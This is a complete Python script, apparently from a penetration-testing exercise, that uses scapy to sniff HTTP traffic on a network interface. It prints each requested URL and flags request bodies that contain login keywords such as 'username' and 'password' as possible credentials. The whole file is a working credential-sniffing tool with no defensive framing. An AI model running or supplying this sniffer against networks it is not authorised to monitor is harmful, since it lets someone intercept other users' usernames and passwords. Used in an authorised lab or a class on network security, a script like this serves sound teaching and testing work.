#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers.http import HTTPRequest


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[HTTPRequest].Host + packet[HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(HTTPRequest):
        if (packet.haslayer(scapy.Raw)):
            keywords = ["username", "password", "login", "kt_login_user"]
            load = str(packet[scapy.Raw].load)
            for keyword in keywords:
                if keyword in load:
                    return load


def process_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)

        if login_info:
            print("\n\n[+] Possible username/password > " +
                  str(login_info) + "\n\n")


sniff("eth0")
